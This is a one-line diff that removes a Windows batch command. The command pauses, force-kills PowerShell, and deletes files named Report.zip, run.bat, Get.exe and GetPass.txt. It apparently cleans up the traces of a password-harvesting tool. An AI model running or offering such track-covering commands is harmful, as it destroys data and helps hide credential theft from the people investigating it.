@@ -1,1 +1,0 @@
-echo ping 127.1 -t 600 && taskkill /f /im powershell.exe && del d:\Report.zip && del d:\run.bat && del d:\Get.exe && del d:\GetPass.txt 
